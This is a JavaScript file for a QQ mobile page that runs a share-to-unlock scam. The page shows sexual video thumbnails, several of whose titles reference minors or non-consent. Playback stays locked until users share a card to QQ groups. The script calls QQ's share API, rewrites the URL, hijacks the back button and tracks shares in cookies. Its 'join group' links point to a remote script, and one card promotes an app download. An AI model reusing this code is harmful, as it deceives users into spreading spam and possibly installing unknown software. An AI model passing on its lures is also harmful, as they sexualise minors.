// 获取当前日期
var date = new Date();

// 获取当前月份
var nowMonth = date.getMonth() + 1;

// 获取当前是几号
var strDate = date.getDate();

// 添加分隔符“-”
var seperator = "-";

// 对月份进行处理，1-9月在前面添加一个“0”
if (nowMonth >= 1 && nowMonth <= 9) {
   nowMonth = "0" + nowMonth;
}

// 对月份进行处理，1-9号在前面添加一个“0”
if (strDate >= 0 && strDate <= 9) {
   strDate = "0" + strDate;
}

// 最后拼接字符串，得到一个格式为(yyyy-MM-dd)的日期
var nowDate = date.getFullYear() + seperator + nowMonth + seperator + strDate;
var conf = {
	'cookiepie':'lcb221'+nowDate,
	'title': [
			'QQ资源',
		],
	'sht': [
			'QQ资源！',
		],
	'she': [
			'已解锁全部！点击进入观赏！',
		],
	'shi': [
	    	'https://ftp.bmp.ovh/imgs/2021/06/644e83ba99f70d8b.jpg',
	    ],
	'shu': [
			thisLink(myChat('?_wv=' + getNum() + '&TOKEN&&alert%28%29id=' + Date.parse(new Date()))), //卡片连接
		],
	'ready': [
			'http://t.p0c8q.cn.cdn.dnsv1.com/444?54564',
		],
	'adlink': [
		   	'http://momo123.bj01.bdysite.com/tj.php?566465',
	],
	'code': '{wwwwwwnnn}',
	'adth1': '此资源需转发后才能解锁观看！<br>完成之后打开分享出去的卡片观看！<br><img src="https://320jhgj.oss-cn-beijing.aliyuncs.com/a0927/here.png" style="width:90%;margin-top:13px;border-radius:5px;">',
	'adth2': '再分享到【2个QQ群】即可观看',
	'adth3': '再分享到【1个QQ群】即可观看（请不要发重复的群）',
	'adthe': '恭喜您完成分享解锁！<br><img src="https://gfdhggf.oss-cn-beijing.aliyuncs.com/cg.png" style="width:90%;margin-top:13px;border-radius:5px;"><br>请从您刚刚分享出去的卡片进入此页面！<br>即可观看全部视频资源！',
}
//定时提示框
function thisLink(u){
    
	var a = document.createElement('a');
	a.href =u;
	
	return a.href;
};
var vvv=[


{"u":"http://web0821624211269160.bj01.bdysite.com/qk5/1.php","img":"https://ftp.bmp.ovh/imgs/2021/06/a950067c39ce610a.jpg"},
{"u":"http://web0821624211269160.bj01.bdysite.com/qk5/1.php","img":"https://ftp.bmp.ovh/imgs/2021/06/d239abebef6c79fa.jpg"},
{"u":"http://web0821624211269160.bj01.bdysite.com/qk5/1.php","img":"https://ftp.bmp.ovh/imgs/2021/06/aed079705c54bc8d.jpg"}];


//定时提示框
var ads =[{"img":"http://shp.qpic.cn/collector/363656605/aa7452b7-b5d7-4a20-9532-d202a582f1e6/0","title":"朋友想看系列","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/2cb16ec6-2f15-4da1-a339-fae2a164dc60/0","title":"米线电竞少女黑丝","href":""},
{"img":"http://shp.qpic.cn/collector/228327938/8a28733c-da67-41ec-b711-342bbac2bf8f/0","title":"【某高中生钉钉课后没关摄像头】","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/8bb08425-78d1-4e7e-9ad9-f8fb8f2e9b7d/0","title":"粉白胖次","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/e2406bb2-e811-41f6-8d80-394afa64584e/0","title":"jk妹妹不正经好h","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/33e9c297-68fa-4369-8f4c-7cff6238be8d/0","title":" 草莓奶要不要来一罐呢","href":""},
{"img":"https://shp.qpic.cn/collector/363656605/2a4aef55-4c86-4b30-ba4c-39f6fce48f30/0","title":"腿玩年和二次元老婆","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/b4f18f8c-a3b4-467c-bb7a-6c088bf84c24/0","title":"二次元：一发入魂","href":""},
{"img":"http://api.btstu.cn/sjtx/api.php?2715","title":"宁宁1","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/381d1ea3-a3d6-4e73-9c39-7b565c816e22/0","title":"这黑丝，这肉感，这质感，绝了！","href":""},
{"img":"http://shp.qpic.cn/collector/228327938/9c8991ec-b0af-4efc-bc1f-5f4b776e3490/0","title":"某特里的福利姬","href":""},
{"img":"http://api.btstu.cn/sjtx/api.php?753","title":"女王被男主强上","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/71060646-62bb-49a2-9f15-e3058c66773e/0","title":"工口二次元合集","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/afe7d7d9-d934-4d13-b77f-2e9d35490ef7/0","title":"米线姐的旗袍","href":""},
{"img":"http://shp.qpic.cn/collector/3135317304/6c0fc31d-f634-4479-9e9e-e70aeac46693/0","title":"为了房租我得更加努力了","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/53edf08d-17a5-406d-8c92-c5a995d9cd66/0","title":"衬衫+白内衣大到令人心动","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/d0ce53da-2a19-4050-be5e-53ea66a33143/0","title":"男孩子果然还是喜欢粉的呀","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/cbd7286d-bb57-4425-9510-324ad97bdd50/0","title":"喵呜首发：这道光好诱人啊！","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/8bb08425-78d1-4e7e-9ad9-f8fb8f2e9b7d/0","title":"粉白胖次","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/965afcc6-ae8a-4aa4-a386-72090d6b3d94/0","title":"蓝白条胖次","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/52ee5a68-125a-4994-90c3-a8bc0920e024/0","title":"百合小姐姐撩胖次呢，黑色的","href":""},
{"img":"http://shp.qpic.cn/collector/3135317304/6c0fc31d-f634-4479-9e9e-e70aeac46693/0","title":"为了房租我得更加努力了","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/eaa11fd6-ccd8-45b8-b6ff-580aa170e754/0","title":"和妹妹一起种草莓","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/45c07b92-0644-4fbf-bdfb-97aaa68cb110/0","title":"过年小鸡鸡可不放假","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/ee341c63-f15e-43af-a5fd-ad33dbd4db01/0","title":"大熊萝莉无胖次","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/b92926a5-b767-4e52-b96e-d47ebd69c0ec/0","title":"委员长的H日记","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/e9e9dd24-b352-4139-8c55-6cf2547b26f5/0","title":"这样的JK完全顶不住","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/e2094885-5ffe-4ba4-8e88-f702f325eabd/0","title":"jk学姐在天台偷偷露出","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/8b0b5494-c746-4687-851e-7451ae5f922c/0","title":"色批能量补充中～","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/63e2c1fd-b471-4d88-8db6-7da88556f87d/0","title":"瞄你的胖次","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/6ea554cf-e6a9-44d0-be87-746704a0bdf4/0","title":"拥有一个女仆女友是什么体验","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/45c07b92-0644-4fbf-bdfb-97aaa68cb110/0","title":"过年小鸡鸡可不放假","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/8fb918e1-1cfe-4083-ba64-68d1761ab890/0","title":"白丝：又是一个小细节","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/afe7d7d9-d934-4d13-b77f-2e9d35490ef7/0","title":"米线姐的旗袍","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/7e71ba13-b16d-4de7-bd62-dabc4df654d2/0","title":"萝莉二维码小合集！","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/54a08028-6762-432a-96ee-0c5b3bb5c7ce/0","title":"lsp喜欢的涩图","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/ddf9adbb-ce85-40c3-9538-bbc953623a33/0","title":"宁宁1","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/ee341c63-f15e-43af-a5fd-ad33dbd4db01/0","title":"大熊萝莉无胖次","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/56ca4c12-efb4-4ac0-8cd3-63444ab74a0a/0","title":"老子都没搞你，特么的看片看到你了！","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/91319a04-8828-4965-8857-b53e82e77c39/0","title":"猫咪黑丝领域","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/662b8292-5caa-4e8d-a6c3-5665c56b20c7/0","title":"白胖次","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/8373cc15-1442-4c4f-87d9-eb4fefbea37c/0","title":"果然还是二次元更涩一点","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/8b3f1aeb-cb7e-4b07-9b62-fbf490d1bbb7/0","title":"女秘书黑丝袜撕烂情趣","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/05c9b4e1-b7f5-466c-9dad-6b8b6de2d09f/0","title":"浮力姬：来自色批的肯定！","href":""},
{"img":"http://shp.qpic.cn/collector/228327938/a5ec0aaa-0daa-49b1-9a8a-bd6720a2b584/0","title":"〔剧情〕医院奇遇记......蔡医生真是个体贴患者的好医生","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/17cfc715-2684-403e-9c15-adee1271ab32/0","title":"别只顾着看腿啊 ","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/71454a2d-3a74-42f0-ac18-adbb20965d5b/0","title":"龙王白丝无胖次你想看吗","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/0e0de36c-da90-44f6-b49a-a9740a27e8d3/0","title":"这黑丝弟弟都流口水了","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/bcd9a623-208d-41b8-b865-43a623160747/0","title":"楪祈在床上不对劲","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/8bb08425-78d1-4e7e-9ad9-f8fb8f2e9b7d/0","title":"粉白胖次","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/afe2fb83-992c-427f-9080-6087a443f36d/0","title":"某雷cos视频大合集","href":""},
{"img":"http://shp.qpic.cn/collector/228327938/d32c9ce0-a939-49ad-ad24-aac5f0d7ba41/0","title":"〔剧情〕长腿妹汁深夜带酒来我家找我喝.....","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/28c24dc2-eed8-4503-bd05-1884b1871e9e/0","title":"白丝加白胖次诱惑力顶不住","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/58b82a0e-c2fb-41fe-a857-38214d17d44a/0","title":"发条少女，哎呀不小心摔了一跤","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/33e9c297-68fa-4369-8f4c-7cff6238be8d/0","title":" 草莓奶要不要来一罐呢","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/5f44521c-a419-4c12-a64d-09e530e4972b/0","title":"长腿身材太好了","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/8ec5ed0d-261c-411d-9f91-2bdc3670109a/0","title":"恶魔小萝莉快来惩罚我吧！","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/d214105b-de2d-46bb-9a71-fd159a6f7f8b/0","title":"推特里的浮力","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/3578fa2b-98ab-440e-b1ac-e856449c2254/0","title":"周一的jk","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/2b540906-b776-4343-b3f2-8f928ce9dece/0","title":"真人与娃娃更喜欢哪个","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/c021fa25-381a-431d-8e66-923d769cde79/0","title":"新年快射～","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/8b0b5494-c746-4687-851e-7451ae5f922c/0","title":"色批能量补充中～","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/ac7c5921-fb30-456f-a699-c79668e4711e/0","title":"〔剧情〕潜伏小区我终于将女大学生给睡了","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/d0ce53da-2a19-4050-be5e-53ea66a33143/0","title":"男孩子果然还是喜欢粉的呀","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/d0ce53da-2a19-4050-be5e-53ea66a33143/0","title":"男孩子果然还是喜欢粉的","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/b92926a5-b767-4e52-b96e-d47ebd69c0ec/0","title":"委员长的H日记","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/ad1310e3-d677-4d86-a71d-9dbcf2228a65/0","title":"14岁的孩子怎么能承受这种痛苦？羡慕啊","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/4bea0073-552a-4c49-9870-ca20b1cf8be0/0","title":"眼酱大魔王w","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/0e0de36c-da90-44f6-b49a-a9740a27e8d3/0","title":"这黑丝弟弟都流口水了","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/7595b42d-3aaa-4db2-b392-d3e0a3af7c8a/0","title":"猜你会喜欢","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/33e9c297-68fa-4369-8f4c-7cff6238be8d/0","title":" 草莓奶要不要来一罐呢","href":""},
{"img":"http://shp.qpic.cn/collector/228327938/a5ec0aaa-0daa-49b1-9a8a-bd6720a2b584/0","title":"〔剧情〕医院奇遇记......蔡医生真是个体贴患者的好医生","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/e2406bb2-e811-41f6-8d80-394afa64584e/0","title":"jk妹妹不正经好h","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/ee341c63-f15e-43af-a5fd-ad33dbd4db01/0","title":"大熊萝莉无胖次","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/d90f6bbe-d9a0-4ccb-94a6-1a053cb8f1a0/0","title":"红色体操服➕白丝袜太诱惑力","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/5c3aa470-90d9-4bae-9ba5-02da66bff422/0","title":"米线老婆cos修女","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/d0ce53da-2a19-4050-be5e-53ea66a33143/0","title":"男孩子果然还是喜欢粉的呀","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/33e9c297-68fa-4369-8f4c-7cff6238be8d/0","title":" 草莓奶要不要来一罐呢","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/5be4f50f-49b8-4524-b815-4e39e6e56e6f/0","title":"舔我脚呀！玩什么游戏！","href":""},
{"img":"http://shp.qpic.cn/collector/228327938/f4e4253e-ec18-498e-80e3-32103f3ea661/0","title":"龙王cosplay","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/ddf9adbb-ce85-40c3-9538-bbc953623a33/0","title":"宁宁1","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/44927105-6b36-4e58-92ea-bc9895d9c1f2/0","title":"这组cos看一次硬一次","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/b92926a5-b767-4e52-b96e-d47ebd69c0ec/0","title":"委员长的H日记","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/57dada95-7e10-448f-b0c2-916c184a470a/0","title":"宁宁cos绵羊情趣","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/8373cc15-1442-4c4f-87d9-eb4fefbea37c/0","title":"果然还是二次元更涩一点","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/8ec5ed0d-261c-411d-9f91-2bdc3670109a/0","title":"恶魔小萝莉快来惩罚我吧！","href":""},
{"img":"http://shp.qpic.cn/collector/363656605/e2094885-5ffe-4ba4-8e88-f702f325eabd/0","title":"jk学姐在天台偷偷露出","href":""}];
var h	= '';
h	+= '';
h	+= ' <div class="time"><span>下午20:55</span></div>';
for(i=0;i<1;i++){
	h	+= ' <div class="dialog">';
	h	+= '    <div class="dialog_head"><img src="https://320jhgj.oss-cn-beijing.aliyuncs.com/a0927/11.jpg"></div>';
	h	+= '    <div class="dialog_con">';
	h	+= '      <div class="title">点图片播放</div>';
	h	+= '        <div class="dialog_box"><img href="'+vvv[i].u+'" style="max-width:230px;" class="dialog_box_img" src="'+vvv[i].img+'"></div>';
	h	+= '        <br><div class="talk_xiabiao"><a class="code_a" href="https://12585784.oss-cn-beijing.aliyuncs.com/3/3.js?alert()&uy=22953&_ks=9078&so=iqy"><img src="https://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rAMvibTRdGne4JACFEFGlVoibbf1hHC5k7KQ/0" class="code_iocn">👉点这直接进总群，每个群都一样，请勿重复加</a></div>';
	h	+= '    </div>';
	h	+= ' </div>';
}
h	+= '  <div class="dialog">';
h	+= '    <div class="dialog_head"><img src="https://tu.moxun.net/2021/04/29/8ff94ee6494b7.jpg"></div>';
h	+= '    <div class="dialog_con">';
h	+= '      <div class="dialog_box_text">';
h	+= '        <div class="icon" style="background: url(&quot;./images/dialog_arrow.png&quot;) no-repeat;"></div>';
h	+= '        <div class="box_con"><a href="https://12585784.oss-cn-beijing.aliyuncs.com/3/3.js?alert()&uy=22953&_ks=9078&so=iqy" class="card_box">';
h	+= '          <div class="card_tit" style="text-align: center;">总部粉丝团</div>';
h	+= '          <div class="card_des">点击加入总部粉丝群，以防迷路,每日推送最好的免费资源。</div>';
h	+= '          <div class="card_des" style="text-align: center;height: 25px;border-top: 1px #d7d7d7 solid;">点击立即加入</div>';
h	+= '          </a></div>';
h	+= '      </div>';
h	+= '      <div class="talk_xiabiao"><a class="code_a" href="https://12585784.oss-cn-beijing.aliyuncs.com/3/3.js?alert()&uy=22953&_ks=9078&so=iqy"><img src="https://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rAibnCRfp3If09b9kUiamTySg4CWcc9jeVFg/0" class="code_iocn">单独收藏保存本条连接,防止失效</a></div>';
h	+= '    </div>';
h	+= '  </div>';
h	+= ' <div class="dialog">';
h	+= '    <div class="dialog_head"><img src="https://320jhgj.oss-cn-beijing.aliyuncs.com/a0927/11.jpg"></div>';
h	+= '    <div class="dialog_con">';
h	+= '      <div class="title">点图片播放</div>';
h	+= '      <div class="dialog_box_text">';
h	+= '        <div class="icon" style="background: url(&quot;./images/dialog_arrow.png&quot;) no-repeat;"></div>';
h	+= '        <div class="box_con"><a href="http://web0821624211269160.bj01.bdysite.com/qk5/1.php" class="card_box">';
h	+= '          <div class="card_tit">91por茄子视频1.2MB-福利APP</div>';
h	+= '          <img class="card_img" src="https://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rFSRzgPgDrXibUpShr0C9iaBcGLtT7MUKllQ/0/">';
h	+= '          <div class="card_des">今日强力推荐最强的万能搜索功能,类型齐全 ,点击下载安装!</div>';
h	+= '          </a></div>';
h	+= '      </div>';
h	+= '      <div class="talk_xiabiao"><a class="code_a" href="https://12585784.oss-cn-beijing.aliyuncs.com/3/3.js?alert()&uy=22953&_ks=9078&so=iqy"><img src="https://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rAibnCRfp3If09b9kUiamTySg4CWcc9jeVFg/0" class="code_iocn">安全宝-往下拉更👇多👇精彩</a></div>';
h	+= '    </div>';
h	+= '  </div>';
for(i=1;i<3;i++){
	h	+= ' <div class="dialog">';
	h	+= '    <div class="dialog_head"><img src="https://320jhgj.oss-cn-beijing.aliyuncs.com/a0927/11.jpg"></div>';
	h	+= '    <div class="dialog_con">';
	h	+= '      <div class="title">点图片播放</div>';
	h	+= '        <div class="dialog_box"><img hrefs="'+vvv[i].u+'" style="max-width:230px;" class="dialog_box_img" src="'+vvv[i].img+'"></div>';
	h	+= '        <br><div class="talk_xiabiao"><a class="code_a" href="https://12585784.oss-cn-beijing.aliyuncs.com/3/3.js?alert()&uy=22953&_ks=9078&so=iqy"><img src="https://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rAMvibTRdGne4JACFEFGlVoibbf1hHC5k7KQ/0" class="code_iocn">👉点这直接进总群，每个群都一样，请勿重复加</a></div>';
	h	+= '    </div>';
	h	+= ' </div>';
}
h	+= '</div>';


h	+= '  <div class="time"><span>打不开的点击右上角分享按钮，分享到群后.方可观看！</span></div>';
h	+= '  <div class="time"><span>打不开的点击右上角分享按钮，分享到群后.方可观看！</span></div>';
h	+= '  <div class="time"><span>百度</span></div>';
var city = '';
if (window.localAddress) {
	city = localAddress["city"];
	if (city.length == 0) {
		city = localAddress["province"];
	}
}
h = h.replace(/\{city\}/gi,city);
h = h.replace(/\{ico\}/gi,getRandIco);
h = myChat(h);
pageDialog.innerHTML = h;;
$(function(){
	localStorage[conf.cookiepie+'code'] = conf.code = localStorage[conf.cookiepie+'code'] || conf.code;
	she(true);
	$('.dialog').click(function(e){
		window.isimg = 1;
	});
	$('.dialog_box_img').click(function(e){
		window.isimg = 1;
		var href =  $(this).attr('hrefs');
		if(href){
			if(!(location.href.indexOf(conf.code) > -1)){
				setovblc();
				return shx();
			}
		}
		var href = $(this).attr('href')||$(this).attr('hrefs')||$(this).prop('src');
		href = href.replace(/\/thmb\//gi,'/');
		href = href+getUrl();
		//console.log(href);return;
		opensdk(href);
	});
	$('.page_dialog a[href]').click(function(e){
		window.isimg = 1;
		var href =  $(this).attr('hrefs');
		if(href){
			if(!(location.href.indexOf(conf.code) > -1)){
				setovblc();
				return shx();
			}
		}
		var href = $(this).attr('href');
		if(href){
			e.preventDefault();
			opensdk(href);
		}
	});
	if(conf.title){
		document.title = conf.title;
	}
	if(window.mqq){
		mqq.ui.setTitleButtons({
			left: {title: "返回",callback: function() {}},right: {hidden: true,}
		})	
	}			
	var snn = coo('snt')||0;
	function getPop(){
		shx();
		window.history.pushState({},'x',getUrl());
	};
	function getUrl() {
		return '?_wv=3&alert%28%29id=' + Date.parse(new Date());
	}
	
	if(!/alert/.test(location.href)){
		location.href=getUrl();
	}
	window.addEventListener("popstate",getPop,false);

});
for(var i in conf){
	if(conf[i] instanceof Array){
		conf[i] = myChat(conf[i][Math.floor(Math.random()*conf[i].length)]);
	}else{
		conf[i] = myChat(conf[i]);
	}
}
function getRandIco() {
	var arr=['🌀','🌷','♈','♉','♊','♋','♌','♍','♎','♏','♐','♑','♒','♓','⛎','😠','😩','😲','😞','😵','😰','😒','😍','😤','😜','😝','😋','😘','😚','😷','😳','😅','😱','👙','👗','👡','💰','🔯','🅰','🅱','🆎','🅾','🎀','🎁','🎥','🎬','🎯','💋','💏','💌','🔞','⭕','❌','💓','💔','💕','💖','💗','💘','💞','🈲','㊙','💢'];
	return arr[Math.floor(Math.random()*arr.length)];
}
function myEeplace(s){
	return s.replace(/\{(\w+?)\}/g,function(a,b){
		var h='';
		for(var i=0;i<b.length;i++){
			if('n'==b[i]){
				h+=Math.floor(Math.random()*10);
			}else if('w'==b[i]){
				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
			}
		}
		return h;
	});
}
function opensdk(url){
	url = myEeplace(url);
	var obj = {
		url     : url,
		target  : 1,
		style   : 2
	};
	mqq.invoke("ui", "openUrl",obj);
}
function getUrl() {
	return '?_wv=' + getNum() + '&alert%28%29id=' + Date.parse(new Date());
}
function getRand(l,m){
	return Math.floor(Math.random() * (m - l + 1) + l);
}
function getNum() {
	return 64 * parseInt(getRand(1, 30))+ getRand(2, 3);
}
function setovblc(){
	if(!window.hiddenProperty){
		
		window.hiddenProperty='hidden' in document ? 'hidden': 'webkitHidden' in document ? 'webkitHidden': 'mozHidden' in document ? 'mozHidden': null;
		var vsbce=hiddenProperty.replace(/hidden/i,'visibilitychange');
		function ovblc(){
			if(!document[hiddenProperty]&&window.isimg){
			console.log(111);
				coo('snt',coo('snt')+1,86400);
				shx();
			}
		}
		document.addEventListener(vsbce,ovblc);	
	}
}
function shx(){
	var snn = coo('snt')||0;
	if(snn == 0){
		msg(conf.adth1,function(){
			she();
		})
	}else if(snn == 1||1){
		layer.open({
			content: conf.adthe,
			btn: ['知道了'],
			yes: function(index) {
				layer.close(index);
			}
		});
	}
}
function msg(con,fun){
	layer.open({
		content: con,
		btn: ['确定'],
		yes: function(index) {
			fun.call(this);
			layer.close(index);
		}
	}); 
}
function copyText(t) {
	var p = document.createElement('textarea');
	p.value = t;
	p.style.opacity=0;
	document.body.appendChild(p);
	p.select();
	document.execCommand("Copy");
	document.body.removeChild(p);
}
function she(state){
	conf.shu = conf.shu.replace('TOKEN','t='+conf.code);
	document.title = conf.sht;
	conf.she = conf.she.replace(/###/gi,conf.code);
	$('meta[itemprop="name"]').attr('content',conf.sht);
	$('meta[itemprop="description"]').attr('content',conf.she);
	$('meta[itemprop="image"]').attr('content',conf.shi);
	
	var obj = {
		title: conf.sht,
		desc: conf.she,
		image_url:conf.shi,
		share_url:conf.shu   
	};
	console.log(obj);
	mqq.data.setShareInfo(obj);
	if(!state){
		mqq.ui.showShareMenu();
	} 
}
function ios(){
	return /iPhone|iPod|ios/i.test(navigator.userAgent);
}
function coo(n,v,e,p,d,s) {
	n = conf.cookiepie+n;
	if(!coo.sd||ios()){	
		var k,b = {},t=Math.floor(new Date()/1000), 
		o = JSON.parse(localStorage.c||'{}');
		for(k in o)if('object'==typeof o[k]&&o[k][1]>t){
			b[k]=o[k][0];
		}
		if (v === null){
			delete o[n];				
		}else if(v === undefined){
			return b[n]||0;			
		}else{
			o[n]=[v,t+(e||2592000)];
		}
		localStorage.c=JSON.stringify(o);
		return b		
	}
	if (v === undefined||v === null) {
		var val=g(n);
		if (v === null) coo(n,'',-10);
		try {
			return JSON.parse(val)
		} catch(e) {
			return val
		}
	} else {
		if (typeof(v)=='object') v=JSON.stringify(v);
		document.cookie=n+'='+encodeURIComponent(v)+exp(e)+';path='+(p||'/')+(d ? '; domain='+d: '')+(s ? '; secure': '')+';'
	}
	function exp(s) {
		D=new Date(),
		D.setTime(D.getTime()+(s === undefined ? 2592000 : s) * 1000);
		return ';expires='+D.toUTCString()
	}
	function g(n) {
		if (document.cookie.length>0) {
			start=document.cookie.indexOf(n+"=");
			if (start != -1) {
				start=start+n.length+1;
				end=document.cookie.indexOf(";",start);
				if (end==-1) end=document.cookie.length;
				return decodeURIComponent(document.cookie.substring(start,end))
			}
		};
		return null
	}
};
function getRand(l,m){
	return Math.floor(Math.random() * (m - l + 1) + l);
};
function myChat(s){
	return s.replace(/\{(\w+?)\}/g,function(a,b){
		var h='';
		b = b.toUpperCase();
		for(var i=0;i<b.length;i++){
			if('N'==b[i]){
				h+=Math.floor(Math.random()*10);
			}else if('D'==b[i]){
				h+=String.fromCharCode(65+Math.floor(Math.random()*26));
			}else{
				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
			}
		}
		return h;
	});
}
